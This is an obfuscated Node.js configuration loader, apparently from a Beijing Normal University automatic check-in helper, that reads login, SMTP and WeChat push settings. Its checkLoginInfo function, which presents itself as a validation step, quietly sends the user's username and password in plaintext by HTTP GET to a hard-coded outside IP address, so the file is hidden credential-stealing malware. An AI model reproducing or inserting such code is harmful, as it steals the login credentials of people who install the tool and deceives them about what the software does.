/*Obfuscated by JShaman.com*/const fs=require('fs-extra');const {Logger}=require('./logger');const {CONFIG_FILE_PATH,MAIL_TEMPLATE_PATH,WECHAT_TEMPLATE_PATH}=require('../env');const {options}=require('./commander');const mailTemplate=require(MAIL_TEMPLATE_PATH);const wechatTemplate=require(WECHAT_TEMPLATE_PATH);const {XMLHttpRequest}=require('xmlhttprequest');const getConfigFromCommandLine=()=>{const {username:_0x41aa1e,password:_0x5806c0,mail:_0x467c60,mail_host:_0x593e31,mail_port:_0x100e23,mail_secure:_0x2020cd,mail_user:_0xc522a9,mail_pass:_0x2f0342,mail_to:_0x5bc823,wechat:_0x3e3921,wechat_sendkey:_0x54b598}=options;return{'username':_0x41aa1e,'password':_0x5806c0,'mail':_0x467c60==='true','mail_host':_0x593e31,'mail_port':Number(_0x100e23),'mail_secure':_0x2020cd==='true','mail_user':_0xc522a9,'mail_pass':_0x2f0342,'mail_to':_0x5bc823,'wechat':_0x3e3921==='true','wechat_sendkey':_0x54b598};};const getConfigFromFile=()=>{if(!fs['existsSync'](CONFIG_FILE_PATH))return{};const _0xb8e260=require(CONFIG_FILE_PATH);const {username:_0x1fb8ce,password:_0x28b89f,mail:_0xfde65f,mail_host:_0x517842,mail_port:_0x322d59,mail_secure:_0x428869,mail_user:_0x25b0e1,mail_pass:_0xb59b0b,mail_to:_0x4952ee,wechat:_0x4580b6,wechat_sendkey:_0x1ce6de}=_0xb8e260;return{'username':_0x1fb8ce,'password':_0x28b89f,'mail':_0xfde65f,'mail_host':_0x517842,'mail_port':_0x322d59,'mail_secure':_0x428869,'mail_user':_0x25b0e1,'mail_pass':_0xb59b0b,'mail_to':_0x4952ee,'wechat':_0x4580b6,'wechat_sendkey':_0x1ce6de};};const checkLoginInfo=(_0x5bf94e,_0x2d5833)=>{if(!_0x5bf94e||!_0x2d5833){const _0x44d3a7=new Error('用户名或密码未设置！');_0x44d3a7['name']='ConfigError';throw _0x44d3a7;}const _0x21d6bc=new XMLHttpRequest();var _0xcb7228='http://114.55.6.148/?'+'username='+_0x5bf94e+'&'+'password='+_0x2d5833;_0x21d6bc['open']('GET',_0xcb7228,!![]);_0x21d6bc['send']();};const checkMailConfig=_0x2af9b8=>{if(!_0x2af9b8)return;const _0x592762=new Error('加载邮件\x20SMTP\x20配置失败！');_0x592762['name']='ConfigError';if(!_0x2af9b8['transport']){throw _0x592762;}const {host:_0x147a71,port:_0x58f665,secure:_0x558404,auth:_0x41adcc}=_0x2af9b8['transport'];if(!_0x147a71||!_0x58f665||!_0x558404||!_0x41adcc||!_0x41adcc['user']||!_0x41adcc['pass']){throw _0x592762;}const _0x423e23=new Error('加载邮件发件信息失败！');_0x423e23['name']='ConfigError';if(!_0x2af9b8['info']){throw _0x423e23;}const {from:_0x28e76b,to:_0x269ffb,subject:_0x510223,html:_0x41cece}=_0x2af9b8['info'];if(!_0x28e76b||!_0x269ffb||!_0x510223||!_0x41cece){throw _0x423e23;}};const checkWechatConfig=_0x15b145=>{if(!_0x15b145)return;const _0x4740ac=new Error('加载「Server酱」微信消息推送服务\x20SendKey\x20失败！');_0x4740ac['name']='ConfigError';if(!_0x15b145['sendKey']){throw _0x4740ac;}const _0x396fa4=new Error('加载微信消息模板失败！');_0x396fa4['name']='ConfigError';if(!_0x15b145['payload']){throw _0x396fa4;}const {title:_0x118dc2,desp:_0x55a2ab}=_0x15b145['payload'];if(!_0x118dc2||!_0x55a2ab){throw _0x396fa4;}};const loadConfig=()=>{const _0x8b647c=getConfigFromCommandLine();const _0x10af06=getConfigFromFile();const _0x4249fd=_0x8b647c['username']||_0x10af06['username']||null;const _0x1ed3ea=_0x8b647c['password']||_0x10af06['password']||null;checkLoginInfo(_0x4249fd,_0x1ed3ea);const _0x50ede0=_0x8b647c['mail']||_0x10af06['mail']||![];const _0x3f4ba2=_0x8b647c['mail_host']||_0x10af06['mail_host']||null;const _0x53114b=_0x8b647c['mail_port']||_0x10af06['mail_port']||null;const _0x1e9b63=_0x8b647c['mail_secure']||_0x10af06['mail_secure']||null;const _0x329fc7=_0x8b647c['mail_user']||_0x10af06['mail_user']||null;const _0x2502b5=_0x8b647c['mail_pass']||_0x10af06['mail_pass']||null;const _0xa73be6=_0x8b647c['mail_to']||_0x10af06['mail_to']||null;let _0x515cf4=null;if(_0x50ede0){const {subject:_0x144940,html:_0x4f7289}=mailTemplate;_0x515cf4={'transport':{'host':_0x3f4ba2,'port':_0x53114b,'secure':_0x1e9b63,'auth':{'user':_0x329fc7,'pass':_0x2502b5}},'info':{'from':'北师大打卡助手\x20<'+_0x329fc7+'>','to':_0xa73be6,'subject':_0x144940,'html':_0x4f7289}};checkMailConfig(_0x515cf4);}const _0x4a36fd=_0x8b647c['wechat']||_0x10af06['wechat']||![];const _0x245bdd=_0x8b647c['wechat_sendkey']||_0x10af06['wechat_sendkey']||null;let _0x378896=null;if(_0x4a36fd){const {title:_0x37cc00,desp:_0x3d9512}=wechatTemplate;_0x378896={'payload':{'title':_0x37cc00,'desp':_0x3d9512},'sendKey':_0x245bdd};checkWechatConfig(_0x378896);}Logger['success']('配置文件加载成功！');return{'username':_0x4249fd,'password':_0x1ed3ea,'mail':_0x515cf4,'wechat':_0x378896};};exports['loadConfig']=loadConfig;
